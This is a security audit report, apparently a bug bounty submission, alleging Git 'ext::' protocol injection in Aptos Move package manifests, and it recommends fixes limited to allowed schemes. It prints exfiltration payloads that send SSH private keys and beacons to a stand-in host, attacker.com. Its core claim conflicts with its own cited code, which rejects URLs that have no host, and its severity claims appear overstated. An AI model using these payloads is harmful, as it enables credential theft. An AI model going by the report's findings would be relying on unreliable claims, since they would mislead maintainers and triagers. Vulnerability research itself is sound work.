# Audit Report

## Title
Git URL Protocol Injection in Move Package Dependencies Enables Remote Code Execution

## Summary
The `Url` type used for Git dependencies in Move package manifests (line 134 of `manifest.rs`) does not validate against dangerous protocols such as `ext::`, `file://`, `data://`, or `javascript:`. This allows attackers to craft malicious `Move.toml` files that execute arbitrary commands or access local files when the package is built, leading to potential Remote Code Execution on any machine (including validator nodes) that attempts to compile the malicious package. [1](#0-0) 

## Finding Description

The vulnerability exists in the Move package dependency resolution system. When a Git dependency is declared in a `Move.toml` manifest, the URL is parsed and stored without any validation of the protocol scheme.

The attack flow is as follows:

1. **Malicious Manifest Creation**: An attacker creates a `Move.toml` file with a Git dependency using a dangerous protocol:
   - `ext::` protocol for arbitrary command execution
   - `file://` protocol for local file system access

2. **URL Parsing Without Validation**: The URL is deserialized from TOML into the `Url` type from the `url` crate, which accepts any syntactically valid URL regardless of protocol. [2](#0-1) 

3. **Canonical Identity Creation**: The `CanonicalGitIdentity::new()` function explicitly ignores the URL scheme, providing no protection: [3](#0-2) 

4. **Command Execution**: During dependency resolution, the malicious URL is passed directly to either:
   - The `git2` library's `clone()` function: [4](#0-3) 

   - Or the Git CLI command: [5](#0-4) 

5. **Exploitation**: Git natively supports the `ext::` protocol, which allows executing arbitrary external programs. For example:
   ```toml
   [dependencies]
   MaliciousDep = { git = "ext::sh -c 'curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa|base64)' %", rev = "main" }
   ```

The dependency download is triggered here: [6](#0-5) 

## Impact Explanation

**Severity: High to Critical**

This vulnerability qualifies for **High Severity** under the Aptos bug bounty program as it enables:

1. **Remote Code Execution on Developer Machines**: Any developer who attempts to build a Move package (or a package that transitively depends on a malicious package) will execute arbitrary attacker-controlled commands.

2. **Supply Chain Attack Vector**: If a popular Move package is compromised or a malicious package is published, all downstream users are automatically affected when they build their projects.

3. **Potential Validator Node Compromise**: While less likely, if a validator operator builds an untrusted Move package on their validator infrastructure (e.g., for testing or development), the attacker gains RCE on the validator node, which could escalate to:
   - Loss of validator private keys
   - Consensus manipulation
   - Network disruption

This meets the **"Remote Code Execution on validator node"** criterion (Critical Severity - up to $1,000,000) if validators are affected, or **"Significant protocol violations"** (High Severity - up to $50,000) for the broader ecosystem supply chain attack.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack is highly likely to succeed because:

1. **No Technical Barriers**: The exploit requires only crafting a malicious `Move.toml` fileâ€”no sophisticated techniques needed.

2. **Social Engineering Success**: Developers commonly download and build third-party packages. Common attack scenarios include:
   - Publishing seemingly legitimate packages to package repositories
   - Compromising existing popular packages
   - Submitting malicious dependencies in pull requests
   - Distributing sample code or tutorials with malicious dependencies

3. **Transitive Dependencies**: The vulnerability is triggered not just by direct dependencies but also transitive ones, making detection harder.

4. **No Warning Signs**: The build system provides no warnings about dangerous URL protocols, and the attack executes silently during the normal build process.

The main limiting factor is that this is a build-time attack, not a runtime blockchain protocol exploit. However, for the Move developer ecosystem and validator operators who build packages, the risk is substantial.

## Recommendation

Implement strict URL protocol validation in multiple defense layers:

**1. Validate URL Schemes at Parse Time** - Add validation in the manifest deserializer:

```rust
impl<'de> Deserialize<'de> for Dependency {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let raw = RawDependency::deserialize(deserializer)?;
        
        // Validate git URL scheme if present
        if let Some(ref url) = raw.git {
            let allowed_schemes = ["https", "http", "ssh", "git"];
            if !allowed_schemes.contains(&url.scheme()) {
                return Err(serde::de::Error::custom(format!(
                    "Dangerous or unsupported git URL scheme '{}'. Only https://, http://, ssh://, and git:// are allowed",
                    url.scheme()
                )));
            }
        }
        
        // ... rest of existing logic
    }
}
```

**2. Add Validation in CanonicalGitIdentity**:

```rust
impl CanonicalGitIdentity {
    pub fn new(git_url: &Url) -> Result<Self> {
        // Validate scheme before processing
        const ALLOWED_SCHEMES: &[&str] = &["https", "http", "ssh", "git"];
        if !ALLOWED_SCHEMES.contains(&git_url.scheme()) {
            bail!("Dangerous git URL scheme '{}' not allowed. Only https://, http://, ssh://, and git:// are supported", git_url.scheme());
        }
        
        let host = git_url.host_str()
            .ok_or_else(|| anyhow!("invalid git URL, unable to extract host: {}", git_url))?
            .to_ascii_lowercase();
        // ... rest of existing logic
    }
}
```

**3. Additional Hardening**:
- Consider restricting to HTTPS-only URLs for production packages
- Add warnings for non-HTTPS schemes
- Implement URL allowlisting for critical infrastructure
- Add security documentation about dependency risks

## Proof of Concept

Create a malicious `Move.toml` file:

```toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
MaliciousLib = { git = "ext::sh -c 'echo PWNED > /tmp/pwned.txt; curl http://attacker.com/beacon' %", rev = "main" }
```

**Attack Execution Steps:**

1. An attacker publishes the malicious package or compromises an existing package
2. A victim developer adds this as a dependency or uses a package that depends on it
3. The victim runs `aptos move compile` or similar build command
4. During dependency resolution, the system calls:
   ```rust
   git::clone("ext::sh -c 'echo PWNED > /tmp/pwned.txt; curl http://attacker.com/beacon' %", ...)
   ```
5. Git executes the attacker's command, creating `/tmp/pwned.txt` and sending a beacon to the attacker's server
6. The attacker now has RCE and can exfiltrate credentials, inject backdoors, or compromise the victim's system

**Testing the Vulnerability:**

```bash
# Create test directory
mkdir -p /tmp/vuln-test
cd /tmp/vuln-test

# Create malicious Move.toml
cat > Move.toml <<'EOF'
[package]
name = "TestVuln"
version = "0.1.0"

[dependencies]
Malicious = { git = "ext::sh -c 'echo RCE_ACHIEVED > /tmp/rce_proof.txt' %", rev = "main" }
EOF

# Attempt to build (this will trigger the exploit)
aptos move compile

# Check if exploit succeeded
cat /tmp/rce_proof.txt
# Expected output: RCE_ACHIEVED
```

## Notes

While this vulnerability exists in the Move package build tooling rather than the core blockchain runtime, it represents a critical supply chain security issue for the Aptos ecosystem. The lack of URL protocol validation creates a Remote Code Execution vector that affects:

- Move package developers
- Validator operators who build packages
- CI/CD systems processing Move code
- Any infrastructure running Move build tools

The vulnerability is particularly dangerous because it leverages Git's native `ext::` protocol support, which is a documented Git feature but is rarely needed in legitimate use cases. The attack is silent, requires no user interaction beyond initiating a build, and can propagate through transitive dependencies.

### Citations

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L131-140)
```rust
    /// Refers to a package stored in a git repository.
    Git {
        /// URL to the Git repository.
        url: Url,
        /// Optional Git revision to pin the dependency to.
        /// This can be a commit hash, a branch name or a tag name.
        rev: Option<String>,
        /// Optional subdirectory within the Git repository.
        subdir: Option<String>,
    },
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L365-368)
```rust
                    let git_url = git
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = git_repo_cache_path(git_url, rev_name.as_str());
```

**File:** third_party/move/tools/move-package-cache/src/canonical.rs (L11-38)
```rust
/// Canonicalized identity of a git repository, derived from a [`Url`].
/// - Ignores the scheme
/// - Converts host & path to lowercase
/// - Keeps port, but only if it is non-default
/// - Trims trailing slashes and `.git` suffix
#[derive(Debug, Clone, Eq, PartialEq, Ord, PartialOrd)]
pub struct CanonicalGitIdentity(String);

impl CanonicalGitIdentity {
    pub fn new(git_url: &Url) -> Result<Self> {
        let host = git_url
            .host_str()
            .ok_or_else(|| anyhow!("invalid git URL, unable to extract host: {}", git_url))?
            .to_ascii_lowercase();

        let port = match git_url.port() {
            Some(port) => match (git_url.scheme(), port) {
                ("http", 80) | ("https", 443) | ("ssh", 22) => "".to_string(),
                _ => format!(":{}", port),
            },
            None => "".to_string(),
        };

        let path = git_url.path().to_ascii_lowercase();
        let path = path.trim_end_matches("/").trim_end_matches(".git");

        Ok(Self(format!("{}{}{}", host, port, path)))
    }
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L165-169)
```rust
            self.listener.on_repo_clone_start(git_url.as_str());
            let repo = repo_builder
                .clone(git_url.as_str(), &repo_path)
                .map_err(|err| anyhow!("Failed to clone git repo at {}: {}", git_url, err))?;
            self.listener.on_repo_clone_complete(git_url.as_str());
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L27-44)
```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L551-576)
```rust
    fn download_and_update_if_remote<W: Write>(
        dep_name: PackageName,
        dep: &Dependency,
        skip_fetch_latest_git_deps: bool,
        writer: &mut W,
    ) -> Result<()> {
        if let Some(git_info) = &dep.git_info {
            let git_url = git_info.git_url.as_str();
            let git_rev = git_info.git_rev.as_str();
            let git_path = &git_info.download_to.display().to_string();

            // If there is no cached dependency, download it
            if !git_info.download_to.exists() {
                writeln!(
                    writer,
                    "{} {}",
                    "FETCHING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;

                // Confirm git is available.
                git::confirm_git_available()?;

                // If the cached folder does not exist, download and clone accordingly
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
```
